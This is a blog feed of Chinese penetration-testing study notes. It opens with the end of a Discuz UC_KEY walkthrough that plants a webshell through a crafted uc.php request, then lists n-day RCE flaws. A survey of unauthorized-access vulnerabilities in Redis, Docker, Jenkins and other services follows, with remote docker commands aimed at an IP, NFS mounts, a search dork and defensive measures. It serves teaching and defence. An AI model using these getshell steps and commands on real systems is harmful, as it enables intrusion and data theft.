class="line">    <span class="keyword">return</span> <span class="variable">$keyc</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>php代码在线运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.dooccn.com/php/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a770%2bezwtH70pSRnAPKKDHWjSt58XdflLRBpD9NGf9Zmrr8QZOG2rGbhLVi6uk3C80NiMvRRxUK%2bEbCiM90</span><br></pre></td></tr></table></figure><p>带code参数GET发送请求 , 请求地址如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/api/uc.php?code=a770%2bezwtH70pSRnAPKKDHWjSt58XdflLRBpD9NGf9Zmrr8QZOG2rGbhLVi6uk3C80NiMvRRxUK%2bEbCiM90</span><br></pre></td></tr></table></figure><p>抓包测试 , 虽然是get请求 , 但是请求体有<code>xml代码</code> , 用来取消转义的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">item</span> <span class="attr">id</span>=<span class="string">&quot;UC_API&quot;</span>&gt;</span>http://192.168.15.106/uc_server<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时 <code>http://127.0.0.1/config/config_ucenter.php</code>就是我们的shell地址<br>使用蚁剑链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dz.com/config/config_ucenter.php</span><br></pre></td></tr></table></figure><p>3.数据恢复<br>主要恢复两个值</p><ul><li>UC_KEY</li><li>config_ucenter.php 文件中插入的木马  文件时间<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">从数据库中读取authkey(uc_server)，通过UC_MYKEY解密获得UC_KEY(dz)，当然也有可能authkey(uc_server)就是UC_KEY(dz)。</span><br><span class="line"></span><br><span class="line">直接进入Ucenter后台修改UC_KEY，修改成我们GetWebShell过程中所设置的值(123456)。或者进入Ucenter后台看到UC_KEY , 保存 , 然后进入后台再修改回来 , 前提是留好其他的马</span><br><span class="line">或者直接在 config/config_ucenter.php 修改文件 UC_KEY的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://dz.com/uc_server/admin.php</span><br><span class="line"></span><br><span class="line">密码</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure></li></ul><h3 id="2、框架的nday"><a href="#2、框架的nday" class="headerlink" title="2、框架的nday"></a>2、框架的nday</h3><ol><li>thinkPHP 漏洞 <ul><li>远程代码执行</li></ul></li><li>strust2 漏洞 <ul><li>远程代码执行 s2-057 s2-062</li></ul></li><li>spring 漏洞 <ul><li>远程代码执行  spel表达式</li><li>CVE-2022-22963  rce</li></ul></li><li>等等</li></ol><h3 id="3、中间件的nday"><a href="#3、中间件的nday" class="headerlink" title="3、中间件的nday"></a>3、中间件的nday</h3><ol><li>tomcat 漏洞 <ul><li>put 任意文件上传</li><li>后台部署war包</li><li>CVE-2019-0232  远程代码执行</li><li>CVE-2020-1938   文件包含</li></ul></li><li>weblogic 漏洞 <ul><li>后台部署war包</li><li>CVE-2017-3506  xmldecode 反序列化 rce</li><li>CVE-2018-2628  T3协议 反序列 rce</li><li>…..</li></ul></li><li>jboss 漏洞  , 这三个也都可以后台部署war包 , getshell <ul><li>后台部署war包</li><li>…..</li></ul></li><li>shiro 漏洞 <ul><li>反序列化 rce , key</li></ul></li><li>等等 ….</li></ol><h3 id="4、web服务器的nday"><a href="#4、web服务器的nday" class="headerlink" title="4、web服务器的nday"></a>4、web服务器的nday</h3><ol><li>apache 漏洞 <ul><li>解析漏洞</li><li>….</li></ul></li><li>nginx 漏洞 <ul><li>解析漏洞</li><li>….</li></ul></li><li>IIS 漏洞 <ul><li>解析漏洞</li></ul></li></ol><h3 id="5、组件的nday"><a href="#5、组件的nday" class="headerlink" title="5、组件的nday"></a>5、组件的nday</h3><ol><li>log4j2 <ul><li>rce , JNDI注入</li></ul></li><li>fastjson <ul><li>反序列话 rce</li><li>1.2.24</li><li>1.2.47</li><li>….</li></ul></li><li>phpmyadmin  ( 通过web页面操作数据库的组件 ) <ul><li>通过写日志getshell</li></ul></li><li>等等 …</li></ol><p>PS：一定要熟悉这些中间件。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 安全知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 安全知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>未授权访问漏洞的学习</title>
      <link href="/2021/11/21/Unauthorized/"/>
      <url>/2021/11/21/Unauthorized/</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;声明：本篇文章只是用于记载学习笔记，学习交流，不可用作其他违规用途。&#x3D;&#x3D;</p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。<br>目前主要存在未授权访问漏洞有：NFS服务，Samba服务，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，Redis，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Duboo等。<br>#二、常见应用的未授权访问<br>##1、Redis未授权访问漏洞<br>###（1）简述<br>Redis默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样会将redis服务暴露到公网上，如果在没有设置密码认证的情况下，会导致任意用户在可以访问模板服务器的情况下未授权访问Redis以及读取Redis的数据，攻击者在未授权访问Redis的情况下，利用Redis自身提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的&#x2F;root&#x2F;.ssh文件夹的authotrized_keys文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。<br>漏洞的产生条件有以下两点：</p><ol><li>redis绑定在0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li><li>没有设置密码认证，可以免密码远程登录redis服务。</li></ol><h3 id="（2）未授权访问"><a href="#（2）未授权访问" class="headerlink" title="（2）未授权访问"></a>（2）未授权访问</h3><p>环境：vulhub&#x2F;redis&#x2F;4-unacc<br>###（3）复现<br>redis-cli<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b01401b04d89417f81231c3123063dcf.png" alt="在这里插入图片描述"></p><p>可以直接连接执行命令，不需要认证，证明存在未授权漏洞。<br>###（4）反弹shell<br>此处不做介绍。<br>##2、Mongodb未授权访问漏洞<br>###（1）漏洞描述<br>开启MongoDB服务时不添加任何参数时，默认是没有权限认证的，登录的用户可以通过默认端口无需密码对数据库任意操作（增删改查高危动作）而且可以远程访问数据库。<br>造成未授权访问的根本原因就在于启动Mongodb的时候未设置–auth也很少会有人会给数据库添加上账号密码，使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登录到数据服务器。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1591f52553ed475c8a7ab91143a86ac9.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>1、为MongoDB添加认证：MongoDB启动时添加–auth参数、为MongoDB添加用户。<br>2、MongoDB自身带有一个HTTP服务和并支持REST接口，在2.6以后这些接口默认是关闭的，mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用，修改配置文件或在启动的时候选择-nohttpinterface参数，nohttpinterface&#x3D;false。<br>3、启动时加入参数–bind_ip 127.0.0.1或在&#x2F;etc&#x2F;mongodb.conf文件中添加以下内容：–bind_ip&#x3D;127.0.0.1。<br>##3、Memcached未授权访问漏洞<br>###（1）简介及危害<br>Memcached是一套常用的key-value分布式高速缓存系统，由于Memcached的安全设计缺陷没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者无需认证通过命令交互可直接读取Memcached中的敏感信息。<br>###（2）漏洞探测<br>直接使用Telnet探测<br>###（3）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c87a4ffc064f4e24a5fbcfd6142efc8f.png" alt="在这里插入图片描述"><br>###（4）防御手段</p><ol><li>设置Memchached只允许本地访问。</li><li>禁⽌外⽹访问Memcached 11211端⼝。</li><li>配置访问控制策略。</li><li>最⼩化权限运⾏。</li><li>修改默认端⼝等。</li></ol><h2 id="4、ZooKeeper未授权访问漏洞"><a href="#4、ZooKeeper未授权访问漏洞" class="headerlink" title="4、ZooKeeper未授权访问漏洞"></a>4、ZooKeeper未授权访问漏洞</h2><h3 id="（1）漏洞简介和危害"><a href="#（1）漏洞简介和危害" class="headerlink" title="（1）漏洞简介和危害"></a>（1）漏洞简介和危害</h3><p>zookeeper是分布式协同管理⼯具，常⽤来管理系统配置信息，提供分布式协同服务。<br>Zookeeper的默认开放端⼝是2181。Zookeeper安装部署之后默认情况下不需要任何身份验<br>证，造成攻击者可以远程利⽤Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内<br>进⾏破坏（⽐如：kill命令）。攻击者能够执⾏所有只允许由管理员运⾏的命令。<br>###（2）复现</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0695abef0e254bd691d7af9123a2266d.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>修改 ZooKeeper 默认端⼝，采⽤其他端⼝服务。</li><li>添加访问控制，配置服务来源地址限制策略。</li><li>增加 ZooKeeper 的认证配置。</li></ol><h2 id="5、Elasticsearch未授权访问漏洞"><a href="#5、Elasticsearch未授权访问漏洞" class="headerlink" title="5、Elasticsearch未授权访问漏洞"></a>5、Elasticsearch未授权访问漏洞</h2><h3 id="（1）漏洞简介"><a href="#（1）漏洞简介" class="headerlink" title="（1）漏洞简介"></a>（1）漏洞简介</h3><p>ElasticSearch是⼀个基于Lucene的搜索服务器。它提供了⼀个分布式多⽤户能⼒的全⽂搜索引擎，基于RESTful web接⼝。Elasticsearch是⽤Java开发的，并作为Apache许可条款下的开放源码发布，是当前流⾏的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接⼝完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进⾏任意操作。业务系统将⾯临敏感数据泄露、数据丢失、数据遭到破坏甚⾄遭到攻击者的勒索。<br>Elasticsearch服务普遍存在⼀个未授权访问的问题，攻击者通常可以请求⼀个开放9200或9300的服务器进⾏恶意攻击。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dfa91f48fc86442ba81c0893a871d7ad.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>4. 访问控制策略，限制IP访问，绑定固定IP。<br>5. 在config&#x2F;elasticsearch.yml中为9200端⼝设置认证等<br>##6、Kibana未授权访问漏洞<br>###（1）漏洞简介<br>Kibana如果允许外⽹访问且没有做安全登录认证，就会被外部任意访问，查看所有数据，造成数据泄露。在默认配置下，Kibana就可以访问Elasticsearch中的所有数据。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d4f29e4a2a2447d0b302c6d3b30fa581.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>6. 升级Kibana到最新版本,升级地址如下<a href="https://www.elastic.co/cn/downloads/kibana%E3%80%82">https://www.elastic.co/cn/downloads/kibana。</a><br>7. 在kibana所在的服务器上安装nginx服务，利⽤nginx的转发指令实现，需要输⼊账号密码才可以访问⻚⾯。<br>8. 如果正常业务中 kibana 服务需要被其他服务器来访问，可以通过 iptables 策略，仅允许指定的 IP 来访问服务。<br>##7、Docker Remote API未授权访问漏洞<br>###（1）漏洞描述<br>    Docker是⼀个开源的应⽤容器引擎，让开发者可以打包他们的应⽤以及依赖包到⼀个可移植的容器中，然后发布到任何流⾏的LINUX机器上，也可以实现虚拟化。 Docker swarm 是⼀个将docker集群变成单⼀虚拟的docker host⼯具，使⽤标准的 DockerAPI，能够⽅便docker集群的管理和扩展，由docker官⽅提供。Docker Remote API如配置不当可导致未授权访问，被攻击者恶意利⽤。攻击者⽆需认证即可访问到Docker数据，可能导致敏感信息泄露，⿊客也可以删除。Docker上的数据,直接访问宿主机上的敏感信息，或对敏感⽂件进⾏修改，最终完全控制服务器。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7339948a1072422a9dea01b20cec7a4c.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>9. 端⼝访问控制<br> 对2375端⼝做⽹络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接⼝。<br>10. 使⽤TLS认证<br>使⽤-H参数连接⽬标主机的docker，使⽤ps命令查询⽬标系统运⾏的镜像。<br>docker -H tcp:&#x2F;&#x2F;13.49.57.65:2375 ps<br>docker -H tcp:&#x2F;&#x2F;13.49.57.65:2375 version<br> 修改docker swarm的认证⽅式，使⽤TLS认证：Overview Swarm with TLS 和Configure Docker Swarm for TLS这两篇⽂档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会⾸先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执⾏。<br>##8、Kubernetes Api Server未授权访问漏洞<br>###（1）漏洞描述<br>Kubernetes 的服务在正常启动后会开启两个端⼝：Localhost Port （默认8080）、Secure Port（默认6443）。这两个端⼝都是提供 Api Server 服务的，⼀个可以直接通过 Web 访问，另⼀个可以通过 kubectl 客户端进⾏调⽤。如果运维⼈员没有合理的配置验证和权限，那么攻击者就可以通过这两个接⼝去获取容器的权限。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/af89e1fd3be24192bef9086a07dcd09b.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>进⾏授权认证</li><li>使⽤Service Account令牌</li><li>置防⽕墙策略</li></ol><h2 id="9、Hadoop未授权访问漏洞"><a href="#9、Hadoop未授权访问漏洞" class="headerlink" title="9、Hadoop未授权访问漏洞"></a>9、Hadoop未授权访问漏洞</h2><h3 id="（1）漏洞描述"><a href="#（1）漏洞描述" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Hadoop是⼀个由Apache基⾦会所开发的分布式系统基础架构，由于服务器直接在开放了Hadoop 机器 HDFS 的 50070 web 端⼝及部分默认服务端⼝，⿊客可以通过命令⾏操作多个⽬录下的数据，如进⾏删除，下载，⽬录浏览甚⾄命令执⾏等操作，产⽣极⼤的危害。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/be0a3a2cdd73410b9485c85e4f60a9ea.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>如⽆必要，关闭 Hadoop Web 管理⻚⾯。</li><li>开启身份验证，防⽌未经授权⽤户访问。</li><li>设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端⼝对公⽹全部禁⽌或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端⼝。</li></ol><h2 id="10、Jenkins未授权访问漏洞"><a href="#10、Jenkins未授权访问漏洞" class="headerlink" title="10、Jenkins未授权访问漏洞"></a>10、Jenkins未授权访问漏洞</h2><h3 id="（1）漏洞描述-1"><a href="#（1）漏洞描述-1" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>默认情况下 Jenkins⾯板中⽤户可以选择执⾏脚本界⾯来操作⼀些系统层命令，攻击者可通过未授权访问漏洞或者暴⼒破解⽤户密码等进⼊后台管理服务，通过脚本执⾏界⾯从⽽获取服务器权限。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dddb61fb34b84f749c35bde711787ee8.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>4. 升级版本。<br>5. 添加认证，设置强密码复杂度及账号锁定。<br>6. 禁⽌把Jenkins直接暴露在公⽹。<br>##11、ActiveMQ未授权访问漏洞<br>###（1）漏洞描述<br>ActiveMQ是⼀款流⾏的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意⼈员可以利⽤默认配置弱点发动远程命令执⾏攻击，获取服务器权限，从⽽导致数据泄露。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/073453ee0e6d4e83a5806d65543a0a0d.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>7. ActiveMQ的安全配置分为控制台安全配置和后台安全配置。控制台安全配置是指⽤户通过浏览器登录ActiveMQ管理界⾯，对ActiveMQ进⾏管理的⼀个安全配置；主要是添加⽤户和密码。后台安全配置是指程序通过ActiveMQ发送消息的⼀个安全配置。<br>8. ActiveMQ后台安全配置。配置置连接ActiveMQ的⽤户名和密码，如果不设置ActiveMQ安全机制，任何知道ActiveMQ服务的IP、端⼝和消息地址的⼈，都可以接受和发送消息。<br>##12、RabbitMQ未授权访问漏洞<br>###（1）漏洞描述<br>RabbitMQ是⽬前⾮常热⻔的⼀款消息中间件，基于AMQP协议的，可以在发布者和使⽤者之间交换异步消息。消息可以是⼈类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/eba6070c570c4a4cb2a304768c0d78e5.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>9. 修改为强密码，删除默认的账号guest。<br>10. 禁⽌对外⽹开放，仅限于内部访问。<br>##13、 Springboot actuator未授权访问漏洞<br>###（1）漏洞描述<br>Actuator 是 springboot 提供的⽤来对应⽤系统进⾏⾃省和监控的功能模块，借助于Actuator 开发者可以很⽅便地对应⽤系统某些监控指标进⾏查看、统计等。在 Actuator 启⽤<br>的情况下，如果没有做好相关权限控制，⾮法⽤户可通过访问默认的执⾏器端点（endpoints）来获取应⽤系统中的监控信息，从⽽导致信息泄露甚⾄服务器被接管的事件发⽣。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/de6cd6a313484a64a670906eab1bdc2c-20230403142347716.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>11. 禁⽤&#x2F;env接⼝。<br>12. 升级到Springboot actuator 2.0。<br>13. 禁⽌对外开放。<br>##14、FTP未授权访问漏洞（匿名登录）<br>###（1）漏洞描述<br>FTP 弱⼝令或匿名登录漏洞，⼀般指使⽤ FTP 的⽤户启⽤了匿名登录功能，或系统⼝令的⻓度太短、复杂度不够、仅包含数字、或仅包含字⺟等，容易被⿊客攻击，发⽣恶意⽂件上传或更严重的⼊侵⾏为。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a1ba19f6e7364623bae37b1f68518003.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>禁止匿名登录<br>##15、JBOSS未授权访问漏洞<br>###（1）漏洞描述<br>JBoss是⼀个基于J2EE的开放源代码应⽤服务器，代码遵循LGPL许可，可以在任何商业应⽤中免费使⽤；JBoss也是⼀个管理EJB的容器和服务器，⽀持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <a href="http://ip:8080/jmx-console">http://ip:8080/jmx-console</a> 就可以浏览 JBoss 的部署管理的信息不需要输⼊⽤户名和密码可以直接部署上传⽊⻢有安全隐患。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/cb985f54969a41af885d7a5d9b6f57f6.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>14. 对jmx控制⻚⾯访问添加访问验证。<br>15. 进⾏JMX Console 安全配置。</p><h2 id="16、Ldap未授权访问漏洞"><a href="#16、Ldap未授权访问漏洞" class="headerlink" title="16、Ldap未授权访问漏洞"></a>16、Ldap未授权访问漏洞</h2><h3 id="（1）漏洞描述-2"><a href="#（1）漏洞描述-2" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>LDAP中⽂全称为：轻型⽬录访问协议（Lightweight Directory Access Protocol），默认使⽤389， LDAP 底层⼀般使⽤ TCP 或 UDP 作为传输协议。⽬录服务是⼀个特殊的数据库，是⼀种以树状结构的⽬录数据库为基础。未对LDAP的访问进⾏密码验证，导致未授权访问。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dce4bc3d417944978aa0852e665dec36.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>16. 修改ldap的acl，不允许匿名访问。<br>17. 根据业务设置ldap访问⽩名单或⿊名单。<br>##17、Rsync未授权访问漏洞<br>###（1）漏洞描述<br>Rsync（remote synchronize）是⼀个远程数据同步⼯具，可通过 LAN&#x2F;WAN 快速同步多台主机间的⽂件，也可以同步本地硬盘中的不同⽬录。Rsync 默认允许匿名访问，如果在配置⽂件中没有相关的⽤户认证以及⽂件授权，就会触发隐患。Rsync 的默认端⼝为 837。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c2aae9361e15420e8b51b9a700ef5c0b.png" alt="在这里插入图片描述"></p><h3 id="（3）防御手段"><a href="#（3）防御手段" class="headerlink" title="（3）防御手段"></a>（3）防御手段</h3><ol start="18"><li>账户认证：正确配置认证⽤户名及密码。</li><li>权限控制：使⽤合理的权限。</li><li>⽹络访问控制：控制接⼊源ip。</li><li>数据加密传输等。</li></ol><h2 id="18、VNC未授权访问漏洞"><a href="#18、VNC未授权访问漏洞" class="headerlink" title="18、VNC未授权访问漏洞"></a>18、VNC未授权访问漏洞</h2><h3 id="（1）漏洞描述-3"><a href="#（1）漏洞描述-3" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>VNC 是虚拟⽹络控制台Virtual Network Console的英⽂缩写。它是⼀款优秀的远程控制⼯具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端⼝号为 5900、5901。VNC 未授权访问漏洞如被利⽤可能造成恶意⽤户直接控制target主机。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7d4e8fad772640b3ab51c700aec2f6e2.png" alt="在这里插入图片描述"><br>###（3）防御手段</p><ol><li>配置 VNC 客户端登录⼝令认证并配置符合密码强度要求的密码。</li><li>以最⼩普通权限身份运⾏操作系统。</li></ol><h2 id="19、-dubbo未授权访问漏洞"><a href="#19、-dubbo未授权访问漏洞" class="headerlink" title="19、 dubbo未授权访问漏洞"></a>19、 dubbo未授权访问漏洞</h2><h3 id="（1）漏洞描述-4"><a href="#（1）漏洞描述-4" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Dubbo是阿⾥巴巴公司开源的⼀个⾼性能优秀的 服务框架，使得应⽤可通过⾼性能的 RPC实现服务的输出和输⼊功能，可以和 Spring框架⽆缝集成。dubbo 因配置不当导致未授权访问漏洞。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/17286ebbf4504d38a1494f85e35816ab.png" alt="在这里插入图片描述"></p><h2 id="20、NFS共享目录未授权访问漏洞"><a href="#20、NFS共享目录未授权访问漏洞" class="headerlink" title="20、NFS共享目录未授权访问漏洞"></a>20、NFS共享目录未授权访问漏洞</h2><h3 id="（1）漏洞描述-5"><a href="#（1）漏洞描述-5" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Network File System(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使⽤者访问⽹络上别处的⽂件就像在使⽤⾃⼰的计算机⼀样。服务器在启⽤nfs服务以后，由于nfs服务未限制对外访问，导致共享⽬录泄漏。<br>###（2）漏洞验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install nfs-common 安装nfs客户端</span><br><span class="line">showmount -e x.x.x.x 查看nfs服务器上的共享⽬录</span><br><span class="line">mount -t nfs x.x.x.x:/grdata /mnt 挂载到本地</span><br><span class="line">umount /mnt/ 卸载共享⽬录</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;公网上大部分都拒绝访问。&#x3D;&#x3D;<br>###（3）防御手段<br>利用iptables限制端口2049和20048端口的访问，禁止外部访问。<br>##21、druid未授权访问漏洞<br>###（1）漏洞描述<br>当开发者配置不当时就可能造成未授权访问下⾯给出常⻅Druid未授权访问路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/druid/websession.html</span><br><span class="line">/system/druid/websession.html</span><br><span class="line">/webpage/system/druid/websession.<span class="title function_ invoke__">html</span>(jeecg)</span><br><span class="line">漏洞特征：</span><br><span class="line"> http:<span class="comment">//www.xxxx.com/druid/index.html</span></span><br></pre></td></tr></table></figure><h3 id="（2）漏洞验证"><a href="#（2）漏洞验证" class="headerlink" title="（2）漏洞验证"></a>（2）漏洞验证</h3><p>google语法：inurl：&#x2F;druid&#x2F;websession.html<br>访问相关的路径。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/99c8879d77fa45db8a8196125fe230c4.png" alt="在这里插入图片描述"></p><h3 id="（3）防御手段-1"><a href="#（3）防御手段-1" class="headerlink" title="（3）防御手段"></a>（3）防御手段</h3><ol><li>配置访问账号密码。</li><li>禁⽌对外⽹开放访问。</li></ol><h2 id="22、CouchDB未授权访问漏洞"><a href="#22、CouchDB未授权访问漏洞" class="headerlink" title="22、CouchDB未授权访问漏洞"></a>22、CouchDB未授权访问漏洞</h2><h3 id="（1）漏洞描述-6"><a href="#（1）漏洞描述-6" class="headerlink" title="（1）漏洞描述"></a>（1）漏洞描述</h3><p>Apache CouchDB是⼀个开源数据库，专注于易⽤性和成为”完全拥抱web的数据库”。它是⼀个使⽤JSON作为存储格式，JavaScript作为查询语⾔，MapReduce和HTTP作为API的NoSQL数据库。应⽤⼴泛，如BBC⽤在其动态内容展示平台，Credit Suisse⽤在其内部的商品部⻔的市场框架，Meebo，⽤在其社交平台（web和应⽤程序）。<br>###（2）漏洞复现<br>在业务逻辑漏洞里讲到过。<br>###（3）防御手段<br>配置密码：配置访问密码，在&#x2F;etc&#x2F;couchdb&#x2F;local.ini中找到admins字段配置密码。<br>##23、Atlassian Crowd未授权访问漏洞<br>###（1）漏洞描述<br>Atlassian Crowd和Atlassian Crowd Data Center都是澳⼤利亚Atlassian公司的产品。Atlassian Crowd是⼀套基于Web的单点登录系统。该系统为多⽤户、⽹络应⽤程序和⽬录服务器提供验证、授权等功能。Atlassian Crowd Data Center是Crowd的集群部署版。AtlassianCrowd和Crowd Data Center在其某些发⾏版本中错误地启⽤了pdkinstall开发插件，使其存在安全漏洞。攻击者利⽤该漏洞可在未授权访问的情况下对Atlassian Crowd和Crowd Data Center安装任意的恶意插件，执⾏任意代码&#x2F;命令，从⽽获得服务器权限。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2ada22f6efaf4cd39e5464be056be33f.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>3. 升级到最新版本。<br>4. 设置访问&#x2F;crowd&#x2F;admin&#x2F;uploadplugin.action的源ip。<br>##24、Jupyter Notebook未授权访问漏洞<br>###（1）漏洞描述<br>Jupyter Notebook（此前被称为 IPython notebook）是⼀个交互式笔记本，⽀持运⾏ 40 多种编程语⾔。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建⼀个console并执⾏任意Python代码和命令，默认端⼝：8888。<br>###（2）复现<br><img src="http://120.48.107.243:9090/blog/2023/04/03/225677810d0843d3a55dae19f8e8ac4a.png" alt="在这里插入图片描述"><br>###（3）防御手段<br>5. 开启身份验证，防止未经授权用户访问<br>6. 访问控制策略，限制IP访问，绑定固定IP<br>## 25、RTSP未授权漏洞<br>###（1）漏洞描述<br>RTSP（Real Time Streaming Protocol），实时流传输协议，是TCP&#x2F;IP协议体系中的⼀个应⽤层协议，该协议定义了⼀对多应⽤程序如何有效地通过IP⽹络传送多媒体数据，被⼴泛⽤于视频直播领域,为⽅便⽤户远程监控摄像头内容，许多摄像头⼚商会在摄像头或NVR中开启RTSP服务器。攻击者可通过VLC等视频播放软件打开rtsp地址进⾏摄像头画⾯的实时查看。<br>###（2）漏洞验证<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0d5021e5e96f4fb0846fb36500b44671.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/b885d7d424f3404d8035b9537042d02a.png" alt="在这里插入图片描述"></p><h3 id="（3）防御手段-2"><a href="#（3）防御手段-2" class="headerlink" title="（3）防御手段"></a>（3）防御手段</h3><ol start="7"><li>修改默认⼝令。</li><li>禁⽌开放到外⽹。</li></ol><h2 id="26、Apache-Spark未授权访问漏洞"><a href="#26、Apache-Spark未授权访问漏洞" class="headerlink" title="26、Apache 